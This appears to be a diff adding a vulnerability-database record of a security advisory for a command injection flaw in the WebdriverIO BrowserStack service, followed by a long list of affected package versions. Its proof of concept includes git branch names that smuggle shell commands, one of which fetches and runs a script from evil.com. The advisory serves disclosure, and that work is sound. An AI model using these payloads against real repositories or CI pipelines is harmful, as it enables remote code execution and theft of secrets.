@@ -1,0 +1,665 @@
+advisory_id: GHSA-5c46-x3qw-q7j7
+datasource_id: github_osv/GHSA-5c46-x3qw-q7j7
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-5c46-x3qw-q7j7/GHSA-5c46-x3qw-q7j7.json
+aliases:
+  - CVE-2026-25244
+summary: |
+  WebdriverIO BrowserStack Service has a Command Injection issue
+  ### Summary
+  A command injection vulnerability exists in `@wdio/browserstack-service` that allows remote code execution (RCE) when processing git branch names in test orchestration. An attacker can exploit this by providing a malicious git repository with a branch name containing shell command injection payloads.
+
+  ### Details
+  _Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._
+
+  ### Vulnerable Code
+  **File**:  https://github.com/webdriverio/webdriverio/blob/ea0e3e00288abced4c739ff9e46c46977b7cdbd2/packages/wdio-browserstack-service/src/testorchestration/helpers.ts#L204
+
+  ### Root Cause
+  User-controlled git branch names are directly interpolated into `execSync()` calls without sanitization. Git allows branch names to contain special characters ,that can be used for command injection.
+  Git allows to create these branches.
+  ```
+  git checkout -b "main;touch\${IFS}/tmp/pwned.txt;echo\${IFS}PWNED"
+  git checkout -b "main;rm\${IFS}/tmp/pwned.txt;echo\${IFS}PWNED"
+  git checkout -b "main;curl\${IFS}evil.com/evil.sh\${IFS}>/tmp/evil.sh;bash\${IFS}/tmp/evil.sh;echo\${IFS}PWNED"
+  ```
+
+
+  ### Attack Vector
+  1. Attacker creates a malicious git repository with a branch name containing command injection payload
+  2. Attacker configures WebdriverIO to use this repository via `testOrchestrationOptions.runSmartSelection.source`. if `source` is not provided it takes current directory as `source`.
+  3. When `getGitMetadataForAISelection()` executes, it extracts the malicious branch name
+  4. Branch name is interpolated into shell commands without sanitization
+  5. Shell interprets special characters and executes attacker's commands
+
+  ### PoC
+  ### Step 1: Create Malicious Repository Branch
+  ```
+  git checkout -b "main;touch\${IFS}/tmp/pwned.txt;echo\${IFS}PWNED"
+  ```
+
+  ### Step 2: Configure WebdriverIO
+
+  ```javascript
+  // wdio.conf.js
+  export const config = {
+      services: [
+          ['browserstack', {
+              user: process.env.BROWSERSTACK_USERNAME,
+              key: process.env.BROWSERSTACK_ACCESS_KEY,
+              testOrchestrationOptions: {
+                  runSmartSelection: {
+                      enabled: true,
+                      source: ['/tmp/malicious-repo']  // ⚠️ Points to malicious repo, without "source" field, it runs in the current directory.
+                  }
+              }
+          }]
+      ],
+      // ... rest of config
+  }
+  ```
+  ### Step 3: Run Tests
+
+  ```bash
+  npm run wdio
+  ```
+  ### Step 4: Verify RCE
+
+  ```bash
+  # Check if file was created (proof of RCE)
+  ls -la /tmp/pwned.txt
+  ```
+
+  ### Impact
+
+  - **Remote Code Execution** on CI/CD servers or developer machines
+  - **Information Disclosure** (environment variables, secrets, credentials)
+  - **Data Exfiltration** (source code, SSH keys, configuration files)
+  - **System Compromise** (backdoor installation, lateral movement)
+  - **Supply Chain Attack** (modify build artifacts)
+impacted_packages:
+  - purl: pkg:npm/%40wdio/browserstack-service
+    affected_versions: vers:npm/<=9.23.2
+    fixed_versions: vers:npm/9.24.0
+    affected_packages:
+      - pkg:npm/%40wdio/browserstack-service@0.0.0-canary-20260722132416
+      - pkg:npm/%40wdio/browserstack-service@5.0.0-beta.12
+      - pkg:npm/%40wdio/browserstack-service@5.0.0-beta.13
+      - pkg:npm/%40wdio/browserstack-service@5.0.0-beta.14
+      - pkg:npm/%40wdio/browserstack-service@5.0.0-beta.15
+      - pkg:npm/%40wdio/browserstack-service@5.0.0-beta.16
+      - pkg:npm/%40wdio/browserstack-service@5.0.0
+      - pkg:npm/%40wdio/browserstack-service@5.0.3
+      - pkg:npm/%40wdio/browserstack-service@5.1.0
+      - pkg:npm/%40wdio/browserstack-service@5.2.2
+      - pkg:npm/%40wdio/browserstack-service@5.2.8
+      - pkg:npm/%40wdio/browserstack-service@5.3.4
+      - pkg:npm/%40wdio/browserstack-service@5.4.1
+      - pkg:npm/%40wdio/browserstack-service@5.4.6
+      - pkg:npm/%40wdio/browserstack-service@5.4.11
+      - pkg:npm/%40wdio/browserstack-service@5.6.0
+      - pkg:npm/%40wdio/browserstack-service@5.6.3
+      - pkg:npm/%40wdio/browserstack-service@5.6.4
+      - pkg:npm/%40wdio/browserstack-service@5.7.0
+      - pkg:npm/%40wdio/browserstack-service@5.7.2
+      - pkg:npm/%40wdio/browserstack-service@5.7.6
+      - pkg:npm/%40wdio/browserstack-service@5.7.8
+      - pkg:npm/%40wdio/browserstack-service@5.7.13
+      - pkg:npm/%40wdio/browserstack-service@5.8.0
+      - pkg:npm/%40wdio/browserstack-service@5.9.0
+      - pkg:npm/%40wdio/browserstack-service@5.9.3
+      - pkg:npm/%40wdio/browserstack-service@5.10.8
+      - pkg:npm/%40wdio/browserstack-service@5.11.0
+      - pkg:npm/%40wdio/browserstack-service@5.11.8
+      - pkg:npm/%40wdio/browserstack-service@5.11.14
+      - pkg:npm/%40wdio/browserstack-service@5.12.0
+      - pkg:npm/%40wdio/browserstack-service@5.12.1
+      - pkg:npm/%40wdio/browserstack-service@5.12.5
+      - pkg:npm/%40wdio/browserstack-service@5.13.2
+      - pkg:npm/%40wdio/browserstack-service@5.16.5
+      - pkg:npm/%40wdio/browserstack-service@5.16.10
+      - pkg:npm/%40wdio/browserstack-service@5.18.1
+      - pkg:npm/%40wdio/browserstack-service@5.18.7
+      - pkg:npm/%40wdio/browserstack-service@5.19.0
+      - pkg:npm/%40wdio/browserstack-service@5.20.0
+      - pkg:npm/%40wdio/browserstack-service@5.20.1
+      - pkg:npm/%40wdio/browserstack-service@5.22.1
+      - pkg:npm/%40wdio/browserstack-service@6.0.0-alpha.0
+      - pkg:npm/%40wdio/browserstack-service@6.0.0-alpha.1
+      - pkg:npm/%40wdio/browserstack-service@6.0.0-beta.0
+      - pkg:npm/%40wdio/browserstack-service@6.0.0-beta.1
+      - pkg:npm/%40wdio/browserstack-service@6.0.0
+      - pkg:npm/%40wdio/browserstack-service@6.0.1
+      - pkg:npm/%40wdio/browserstack-service@6.0.4
+      - pkg:npm/%40wdio/browserstack-service@6.0.6
+      - pkg:npm/%40wdio/browserstack-service@6.0.7
+      - pkg:npm/%40wdio/browserstack-service@6.0.8
+      - pkg:npm/%40wdio/browserstack-service@6.0.10
+      - pkg:npm/%40wdio/browserstack-service@6.0.11
+      - pkg:npm/%40wdio/browserstack-service@6.0.12
+      - pkg:npm/%40wdio/browserstack-service@6.0.16
+      - pkg:npm/%40wdio/browserstack-service@6.0.17
+      - pkg:npm/%40wdio/browserstack-service@6.1.4
+      - pkg:npm/%40wdio/browserstack-service@6.1.10
+      - pkg:npm/%40wdio/browserstack-service@6.1.14
+      - pkg:npm/%40wdio/browserstack-service@6.1.15
+      - pkg:npm/%40wdio/browserstack-service@6.4.0
+      - pkg:npm/%40wdio/browserstack-service@6.4.6
+      - pkg:npm/%40wdio/browserstack-service@6.4.7
+      - pkg:npm/%40wdio/browserstack-service@6.6.0
+      - pkg:npm/%40wdio/browserstack-service@6.6.3
+      - pkg:npm/%40wdio/browserstack-service@6.6.7
+      - pkg:npm/%40wdio/browserstack-service@6.7.3
+      - pkg:npm/%40wdio/browserstack-service@6.8.0
+      - pkg:npm/%40wdio/browserstack-service@6.10.0
+      - pkg:npm/%40wdio/browserstack-service@6.10.4
+      - pkg:npm/%40wdio/browserstack-service@6.10.10
+      - pkg:npm/%40wdio/browserstack-service@6.12.0
+      - pkg:npm/%40wdio/browserstack-service@6.12.1
+      - pkg:npm/%40wdio/browserstack-service@7.0.0-beta.0
+      - pkg:npm/%40wdio/browserstack-service@7.0.0-beta.1
+      - pkg:npm/%40wdio/browserstack-service@7.0.0-beta.2
+      - pkg:npm/%40wdio/browserstack-service@7.0.0-beta.3
+      - pkg:npm/%40wdio/browserstack-service@7.0.0-beta.4
+      - pkg:npm/%40wdio/browserstack-service@7.0.0
+      - pkg:npm/%40wdio/browserstack-service@7.0.1
+      - pkg:npm/%40wdio/browserstack-service@7.0.2
+      - pkg:npm/%40wdio/browserstack-service@7.0.3
+      - pkg:npm/%40wdio/browserstack-service@7.0.4
+      - pkg:npm/%40wdio/browserstack-service@7.0.5
+      - pkg:npm/%40wdio/browserstack-service@7.0.7
+      - pkg:npm/%40wdio/browserstack-service@7.0.8
+      - pkg:npm/%40wdio/browserstack-service@7.0.9
+      - pkg:npm/%40wdio/browserstack-service@7.1.0
+      - pkg:npm/%40wdio/browserstack-service@7.1.1
+      - pkg:npm/%40wdio/browserstack-service@7.2.0
+      - pkg:npm/%40wdio/browserstack-service@7.2.1
+      - pkg:npm/%40wdio/browserstack-service@7.2.2
+      - pkg:npm/%40wdio/browserstack-service@7.2.3
+      - pkg:npm/%40wdio/browserstack-service@7.3.0
+      - pkg:npm/%40wdio/browserstack-service@7.3.1
+      - pkg:npm/%40wdio/browserstack-service@7.4.0
+      - pkg:npm/%40wdio/browserstack-service@7.4.1
+      - pkg:npm/%40wdio/browserstack-service@7.4.2
+      - pkg:npm/%40wdio/browserstack-service@7.4.5
+      - pkg:npm/%40wdio/browserstack-service@7.4.6
+      - pkg:npm/%40wdio/browserstack-service@7.5.0
+      - pkg:npm/%40wdio/browserstack-service@7.5.1
+      - pkg:npm/%40wdio/browserstack-service@7.5.2
+      - pkg:npm/%40wdio/browserstack-service@7.5.3
+      - pkg:npm/%40wdio/browserstack-service@7.5.6
+      - pkg:npm/%40wdio/browserstack-service@7.5.7
+      - pkg:npm/%40wdio/browserstack-service@7.6.0
+      - pkg:npm/%40wdio/browserstack-service@7.6.1
+      - pkg:npm/%40wdio/browserstack-service@7.7.0
+      - pkg:npm/%40wdio/browserstack-service@7.7.2
+      - pkg:npm/%40wdio/browserstack-service@7.7.3
+      - pkg:npm/%40wdio/browserstack-service@7.7.4
+      - pkg:npm/%40wdio/browserstack-service@7.7.5
+      - pkg:npm/%40wdio/browserstack-service@7.7.6
+      - pkg:npm/%40wdio/browserstack-service@7.7.7
+      - pkg:npm/%40wdio/browserstack-service@7.7.8
+      - pkg:npm/%40wdio/browserstack-service@7.8.0
+      - pkg:npm/%40wdio/browserstack-service@7.9.0
+      - pkg:npm/%40wdio/browserstack-service@7.9.1
+      - pkg:npm/%40wdio/browserstack-service@7.10.0
+      - pkg:npm/%40wdio/browserstack-service@7.10.1
+      - pkg:npm/%40wdio/browserstack-service@7.11.0
+      - pkg:npm/%40wdio/browserstack-service@7.11.1
+      - pkg:npm/%40wdio/browserstack-service@7.12.0
+      - pkg:npm/%40wdio/browserstack-service@7.12.1
+      - pkg:npm/%40wdio/browserstack-service@7.12.2
+      - pkg:npm/%40wdio/browserstack-service@7.12.3
+      - pkg:npm/%40wdio/browserstack-service@7.12.4
+      - pkg:npm/%40wdio/browserstack-service@7.12.5
+      - pkg:npm/%40wdio/browserstack-service@7.13.0
+      - pkg:npm/%40wdio/browserstack-service@7.13.1
+      - pkg:npm/%40wdio/browserstack-service@7.13.2
+      - pkg:npm/%40wdio/browserstack-service@7.14.1
+      - pkg:npm/%40wdio/browserstack-service@7.16.0
+      - pkg:npm/%40wdio/browserstack-service@7.16.1
+      - pkg:npm/%40wdio/browserstack-service@7.16.2
+      - pkg:npm/%40wdio/browserstack-service@7.16.3
+      - pkg:npm/%40wdio/browserstack-service@7.16.4
+      - pkg:npm/%40wdio/browserstack-service@7.16.5
+      - pkg:npm/%40wdio/browserstack-service@7.16.6
+      - pkg:npm/%40wdio/browserstack-service@7.16.7
+      - pkg:npm/%40wdio/browserstack-service@7.16.8
+      - pkg:npm/%40wdio/browserstack-service@7.16.9
+      - pkg:npm/%40wdio/browserstack-service@7.16.10
+      - pkg:npm/%40wdio/browserstack-service@7.16.11
+      - pkg:npm/%40wdio/browserstack-service@7.16.12
+      - pkg:npm/%40wdio/browserstack-service@7.16.13
+      - pkg:npm/%40wdio/browserstack-service@7.16.14
+      - pkg:npm/%40wdio/browserstack-service@7.16.15
+      - pkg:npm/%40wdio/browserstack-service@7.16.16
+      - pkg:npm/%40wdio/browserstack-service@7.17.0
+      - pkg:npm/%40wdio/browserstack-service@7.17.3
+      - pkg:npm/%40wdio/browserstack-service@7.17.4
+      - pkg:npm/%40wdio/browserstack-service@7.18.0
+      - pkg:npm/%40wdio/browserstack-service@7.18.1
+      - pkg:npm/%40wdio/browserstack-service@7.19.0
+      - pkg:npm/%40wdio/browserstack-service@7.19.1
+      - pkg:npm/%40wdio/browserstack-service@7.19.2
+      - pkg:npm/%40wdio/browserstack-service@7.19.3
+      - pkg:npm/%40wdio/browserstack-service@7.19.4
+      - pkg:npm/%40wdio/browserstack-service@7.19.5
+      - pkg:npm/%40wdio/browserstack-service@7.19.7
+      - pkg:npm/%40wdio/browserstack-service@7.20.0
+      - pkg:npm/%40wdio/browserstack-service@7.20.1
+      - pkg:npm/%40wdio/browserstack-service@7.20.2
+      - pkg:npm/%40wdio/browserstack-service@7.20.3
+      - pkg:npm/%40wdio/browserstack-service@7.20.4
+      - pkg:npm/%40wdio/browserstack-service@7.20.5
+      - pkg:npm/%40wdio/browserstack-service@7.20.6
+      - pkg:npm/%40wdio/browserstack-service@7.20.7
+      - pkg:npm/%40wdio/browserstack-service@7.20.8-alpha.504
+      - pkg:npm/%40wdio/browserstack-service@7.20.8
+      - pkg:npm/%40wdio/browserstack-service@7.20.9
+      - pkg:npm/%40wdio/browserstack-service@7.21.0
+      - pkg:npm/%40wdio/browserstack-service@7.22.0
+      - pkg:npm/%40wdio/browserstack-service@7.23.0
+      - pkg:npm/%40wdio/browserstack-service@7.24.0
+      - pkg:npm/%40wdio/browserstack-service@7.24.1
+      - pkg:npm/%40wdio/browserstack-service@7.25.0
+      - pkg:npm/%40wdio/browserstack-service@7.25.1
+      - pkg:npm/%40wdio/browserstack-service@7.25.2
+      - pkg:npm/%40wdio/browserstack-service@7.25.4
+      - pkg:npm/%40wdio/browserstack-service@7.26.0
+      - pkg:npm/%40wdio/browserstack-service@7.27.0
+      - pkg:npm/%40wdio/browserstack-service@7.28.0
+      - pkg:npm/%40wdio/browserstack-service@7.28.1
+      - pkg:npm/%40wdio/browserstack-service@7.29.0
+      - pkg:npm/%40wdio/browserstack-service@7.29.1
+      - pkg:npm/%40wdio/browserstack-service@7.30.0
+      - pkg:npm/%40wdio/browserstack-service@7.30.1
+      - pkg:npm/%40wdio/browserstack-service@7.30.2
+      - pkg:npm/%40wdio/browserstack-service@7.30.3
+      - pkg:npm/%40wdio/browserstack-service@7.31.1
+      - pkg:npm/%40wdio/browserstack-service@7.32.0
+      - pkg:npm/%40wdio/browserstack-service@7.32.1
+      - pkg:npm/%40wdio/browserstack-service@7.32.2
+      - pkg:npm/%40wdio/browserstack-service@7.32.3
+      - pkg:npm/%40wdio/browserstack-service@7.32.4
+      - pkg:npm/%40wdio/browserstack-service@7.33.0
+      - pkg:npm/%40wdio/browserstack-service@7.34.0
+      - pkg:npm/%40wdio/browserstack-service@7.35.0
+      - pkg:npm/%40wdio/browserstack-service@7.36.0
+      - pkg:npm/%40wdio/browserstack-service@7.37.0
+      - pkg:npm/%40wdio/browserstack-service@7.37.1
+      - pkg:npm/%40wdio/browserstack-service@7.38.0
+      - pkg:npm/%40wdio/browserstack-service@7.38.1
+      - pkg:npm/%40wdio/browserstack-service@7.39.0
+      - pkg:npm/%40wdio/browserstack-service@7.40.0
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.213
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.219
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.239
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.240
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.243
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.249
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.327
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.328
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.329
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.330
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.331
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.365
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.411
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.412
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.504
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.505
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.507
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.508
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.512
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.516
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.518
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.537
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.547
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.558
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.563
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.565
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.577
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.589
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.593
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.598
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.600
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.607
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.619
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.620
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.621
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.629
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.630
+      - pkg:npm/%40wdio/browserstack-service@8.0.0-alpha.631
+      - pkg:npm/%40wdio/browserstack-service@8.0.0
+      - pkg:npm/%40wdio/browserstack-service@8.0.1
+      - pkg:npm/%40wdio/browserstack-service@8.0.2
+      - pkg:npm/%40wdio/browserstack-service@8.0.6
+      - pkg:npm/%40wdio/browserstack-service@8.0.7
+      - pkg:npm/%40wdio/browserstack-service@8.0.8
+      - pkg:npm/%40wdio/browserstack-service@8.0.10
+      - pkg:npm/%40wdio/browserstack-service@8.0.11
+      - pkg:npm/%40wdio/browserstack-service@8.0.14
+      - pkg:npm/%40wdio/browserstack-service@8.1.0
+      - pkg:npm/%40wdio/browserstack-service@8.1.1
+      - pkg:npm/%40wdio/browserstack-service@8.1.2
+      - pkg:npm/%40wdio/browserstack-service@8.1.3
+      - pkg:npm/%40wdio/browserstack-service@8.2.0
+      - pkg:npm/%40wdio/browserstack-service@8.2.1
+      - pkg:npm/%40wdio/browserstack-service@8.2.2
+      - pkg:npm/%40wdio/browserstack-service@8.2.3
+      - pkg:npm/%40wdio/browserstack-service@8.2.4
+      - pkg:npm/%40wdio/browserstack-service@8.2.5
+      - pkg:npm/%40wdio/browserstack-service@8.2.6
+      - pkg:npm/%40wdio/browserstack-service@8.3.0
+      - pkg:npm/%40wdio/browserstack-service@8.3.1
+      - pkg:npm/%40wdio/browserstack-service@8.3.2
+      - pkg:npm/%40wdio/browserstack-service@8.3.3
+      - pkg:npm/%40wdio/browserstack-service@8.3.5
+      - pkg:npm/%40wdio/browserstack-service@8.3.8
+      - pkg:npm/%40wdio/browserstack-service@8.3.9
+      - pkg:npm/%40wdio/browserstack-service@8.3.10
+      - pkg:npm/%40wdio/browserstack-service@8.3.11
+      - pkg:npm/%40wdio/browserstack-service@8.4.0
+      - pkg:npm/%40wdio/browserstack-service@8.5.0
+      - pkg:npm/%40wdio/browserstack-service@8.5.1
+      - pkg:npm/%40wdio/browserstack-service@8.5.5
+      - pkg:npm/%40wdio/browserstack-service@8.5.6
+      - pkg:npm/%40wdio/browserstack-service@8.5.7
+      - pkg:npm/%40wdio/browserstack-service@8.5.8
+      - pkg:npm/%40wdio/browserstack-service@8.5.9
+      - pkg:npm/%40wdio/browserstack-service@8.6.0
+      - pkg:npm/%40wdio/browserstack-service@8.6.1
+      - pkg:npm/%40wdio/browserstack-service@8.6.2
+      - pkg:npm/%40wdio/browserstack-service@8.6.3
+      - pkg:npm/%40wdio/browserstack-service@8.6.6
+      - pkg:npm/%40wdio/browserstack-service@8.6.7
+      - pkg:npm/%40wdio/browserstack-service@8.6.8
+      - pkg:npm/%40wdio/browserstack-service@8.6.9
+      - pkg:npm/%40wdio/browserstack-service@8.7.0
+      - pkg:npm/%40wdio/browserstack-service@8.8.0
+      - pkg:npm/%40wdio/browserstack-service@8.8.1
+      - pkg:npm/%40wdio/browserstack-service@8.8.2
+      - pkg:npm/%40wdio/browserstack-service@8.8.3
+      - pkg:npm/%40wdio/browserstack-service@8.8.4
+      - pkg:npm/%40wdio/browserstack-service@8.8.6
+      - pkg:npm/%40wdio/browserstack-service@8.8.7
+      - pkg:npm/%40wdio/browserstack-service@8.8.8
+      - pkg:npm/%40wdio/browserstack-service@8.9.0
+      - pkg:npm/%40wdio/browserstack-service@8.10.0
+      - pkg:npm/%40wdio/browserstack-service@8.10.1
+      - pkg:npm/%40wdio/browserstack-service@8.10.2
+      - pkg:npm/%40wdio/browserstack-service@8.10.4
+      - pkg:npm/%40wdio/browserstack-service@8.10.5
+      - pkg:npm/%40wdio/browserstack-service@8.10.6
+      - pkg:npm/%40wdio/browserstack-service@8.10.7
+      - pkg:npm/%40wdio/browserstack-service@8.11.0
+      - pkg:npm/%40wdio/browserstack-service@8.11.1
+      - pkg:npm/%40wdio/browserstack-service@8.11.2
+      - pkg:npm/%40wdio/browserstack-service@8.11.3
+      - pkg:npm/%40wdio/browserstack-service@8.12.1
+      - pkg:npm/%40wdio/browserstack-service@8.12.2
+      - pkg:npm/%40wdio/browserstack-service@8.12.3
+      - pkg:npm/%40wdio/browserstack-service@8.13.0
+      - pkg:npm/%40wdio/browserstack-service@8.13.1
+      - pkg:npm/%40wdio/browserstack-service@8.13.3
+      - pkg:npm/%40wdio/browserstack-service@8.13.4
+      - pkg:npm/%40wdio/browserstack-service@8.13.10
+      - pkg:npm/%40wdio/browserstack-service@8.13.12
+      - pkg:npm/%40wdio/browserstack-service@8.13.13
+      - pkg:npm/%40wdio/browserstack-service@8.14.0
+      - pkg:npm/%40wdio/browserstack-service@8.14.1
+      - pkg:npm/%40wdio/browserstack-service@8.14.2
+      - pkg:npm/%40wdio/browserstack-service@8.14.3
+      - pkg:npm/%40wdio/browserstack-service@8.14.6
+      - pkg:npm/%40wdio/browserstack-service@8.15.0
+      - pkg:npm/%40wdio/browserstack-service@8.15.4
+      - pkg:npm/%40wdio/browserstack-service@8.15.6
+      - pkg:npm/%40wdio/browserstack-service@8.15.7
+      - pkg:npm/%40wdio/browserstack-service@8.15.8
+      - pkg:npm/%40wdio/browserstack-service@8.15.9
+      - pkg:npm/%40wdio/browserstack-service@8.15.10
+      - pkg:npm/%40wdio/browserstack-service@8.16.0
+      - pkg:npm/%40wdio/browserstack-service@8.16.2
+      - pkg:npm/%40wdio/browserstack-service@8.16.3
+      - pkg:npm/%40wdio/browserstack-service@8.16.4
+      - pkg:npm/%40wdio/browserstack-service@8.16.5
+      - pkg:npm/%40wdio/browserstack-service@8.16.6
+      - pkg:npm/%40wdio/browserstack-service@8.16.7
+      - pkg:npm/%40wdio/browserstack-service@8.16.9
+      - pkg:npm/%40wdio/browserstack-service@8.16.10
+      - pkg:npm/%40wdio/browserstack-service@8.16.11
+      - pkg:npm/%40wdio/browserstack-service@8.16.12
+      - pkg:npm/%40wdio/browserstack-service@8.16.13
+      - pkg:npm/%40wdio/browserstack-service@8.16.14
+      - pkg:npm/%40wdio/browserstack-service@8.16.15
+      - pkg:npm/%40wdio/browserstack-service@8.16.16
+      - pkg:npm/%40wdio/browserstack-service@8.16.17
+      - pkg:npm/%40wdio/browserstack-service@8.16.18
+      - pkg:npm/%40wdio/browserstack-service@8.16.19
+      - pkg:npm/%40wdio/browserstack-service@8.16.20
+      - pkg:npm/%40wdio/browserstack-service@8.16.22
+      - pkg:npm/%40wdio/browserstack-service@8.17.0
+      - pkg:npm/%40wdio/browserstack-service@8.18.0
+      - pkg:npm/%40wdio/browserstack-service@8.18.2
+      - pkg:npm/%40wdio/browserstack-service@8.19.0
+      - pkg:npm/%40wdio/browserstack-service@8.20.0
+      - pkg:npm/%40wdio/browserstack-service@8.20.3
+      - pkg:npm/%40wdio/browserstack-service@8.20.4
+      - pkg:npm/%40wdio/browserstack-service@8.20.5
+      - pkg:npm/%40wdio/browserstack-service@8.21.0
+      - pkg:npm/%40wdio/browserstack-service@8.22.0
+      - pkg:npm/%40wdio/browserstack-service@8.22.1
+      - pkg:npm/%40wdio/browserstack-service@8.23.0
+      - pkg:npm/%40wdio/browserstack-service@8.23.1
+      - pkg:npm/%40wdio/browserstack-service@8.23.2
+      - pkg:npm/%40wdio/browserstack-service@8.23.3
+      - pkg:npm/%40wdio/browserstack-service@8.23.4
+      - pkg:npm/%40wdio/browserstack-service@8.23.5
+      - pkg:npm/%40wdio/browserstack-service@8.24.0
+      - pkg:npm/%40wdio/browserstack-service@8.24.1
+      - pkg:npm/%40wdio/browserstack-service@8.24.2
+      - pkg:npm/%40wdio/browserstack-service@8.24.3
+      - pkg:npm/%40wdio/browserstack-service@8.24.4
+      - pkg:npm/%40wdio/browserstack-service@8.24.5
+      - pkg:npm/%40wdio/browserstack-service@8.24.6
+      - pkg:npm/%40wdio/browserstack-service@8.24.9
+      - pkg:npm/%40wdio/browserstack-service@8.24.12
+      - pkg:npm/%40wdio/browserstack-service@8.26.0
+      - pkg:npm/%40wdio/browserstack-service@8.26.1-alpha.1
+      - pkg:npm/%40wdio/browserstack-service@8.26.1
+      - pkg:npm/%40wdio/browserstack-service@8.26.2
+      - pkg:npm/%40wdio/browserstack-service@8.26.3
+      - pkg:npm/%40wdio/browserstack-service@8.27.0
+      - pkg:npm/%40wdio/browserstack-service@8.27.1
+      - pkg:npm/%40wdio/browserstack-service@8.27.2
+      - pkg:npm/%40wdio/browserstack-service@8.28.0
+      - pkg:npm/%40wdio/browserstack-service@8.28.4
+      - pkg:npm/%40wdio/browserstack-service@8.28.6
+      - pkg:npm/%40wdio/browserstack-service@8.28.8
+      - pkg:npm/%40wdio/browserstack-service@8.29.0
+      - pkg:npm/%40wdio/browserstack-service@8.29.1
+      - pkg:npm/%40wdio/browserstack-service@8.29.3
+      - pkg:npm/%40wdio/browserstack-service@8.29.7
+      - pkg:npm/%40wdio/browserstack-service@8.30.0
+      - pkg:npm/%40wdio/browserstack-service@8.31.0
+      - pkg:npm/%40wdio/browserstack-service@8.31.1
+      - pkg:npm/%40wdio/browserstack-service@8.32.0
+      - pkg:npm/%40wdio/browserstack-service@8.32.1
+      - pkg:npm/%40wdio/browserstack-service@8.32.2
+      - pkg:npm/%40wdio/browserstack-service@8.32.3
+      - pkg:npm/%40wdio/browserstack-service@8.32.4
+      - pkg:npm/%40wdio/browserstack-service@8.33.0
+      - pkg:npm/%40wdio/browserstack-service@8.33.1
+      - pkg:npm/%40wdio/browserstack-service@8.34.0
+      - pkg:npm/%40wdio/browserstack-service@8.34.1
+      - pkg:npm/%40wdio/browserstack-service@8.35.0
+      - pkg:npm/%40wdio/browserstack-service@8.35.1
+      - pkg:npm/%40wdio/browserstack-service@8.36.0
+      - pkg:npm/%40wdio/browserstack-service@8.36.1
+      - pkg:npm/%40wdio/browserstack-service@8.37.0
+      - pkg:npm/%40wdio/browserstack-service@8.38.0
+      - pkg:npm/%40wdio/browserstack-service@8.38.2
+      - pkg:npm/%40wdio/browserstack-service@8.39.0
+      - pkg:npm/%40wdio/browserstack-service@8.39.1
+      - pkg:npm/%40wdio/browserstack-service@8.40.0
+      - pkg:npm/%40wdio/browserstack-service@8.40.2
+      - pkg:npm/%40wdio/browserstack-service@8.40.3
+      - pkg:npm/%40wdio/browserstack-service@8.40.5
+      - pkg:npm/%40wdio/browserstack-service@8.40.6
+      - pkg:npm/%40wdio/browserstack-service@8.41.0
+      - pkg:npm/%40wdio/browserstack-service@8.42.0
+      - pkg:npm/%40wdio/browserstack-service@8.43.0
+      - pkg:npm/%40wdio/browserstack-service@8.44.0
+      - pkg:npm/%40wdio/browserstack-service@8.44.1
+      - pkg:npm/%40wdio/browserstack-service@8.45.0
+      - pkg:npm/%40wdio/browserstack-service@8.46.0
+      - pkg:npm/%40wdio/browserstack-service@8.47.0
+      - pkg:npm/%40wdio/browserstack-service@8.47.1
+      - pkg:npm/%40wdio/browserstack-service@8.48.0
+      - pkg:npm/%40wdio/browserstack-service@8.48.3
+      - pkg:npm/%40wdio/browserstack-service@8.49.0
+      - pkg:npm/%40wdio/browserstack-service@8.49.1
+      - pkg:npm/%40wdio/browserstack-service@8.49.2
+      - pkg:npm/%40wdio/browserstack-service@8.50.0
+      - pkg:npm/%40wdio/browserstack-service@9.0.0-alpha.0
+      - pkg:npm/%40wdio/browserstack-service@9.0.0-alpha.9
+      - pkg:npm/%40wdio/browserstack-service@9.0.0-alpha.59
+      - pkg:npm/%40wdio/browserstack-service@9.0.0-alpha.64
+      - pkg:npm/%40wdio/browserstack-service@9.0.0-alpha.78
+      - pkg:npm/%40wdio/browserstack-service@9.0.0-alpha.113
+      - pkg:npm/%40wdio/browserstack-service@9.0.0-alpha.114
+      - pkg:npm/%40wdio/browserstack-service@9.0.0-alpha.115
+      - pkg:npm/%40wdio/browserstack-service@9.0.0-alpha.321
+      - pkg:npm/%40wdio/browserstack-service@9.0.0-alpha.350
+      - pkg:npm/%40wdio/browserstack-service@9.0.0-alpha.351
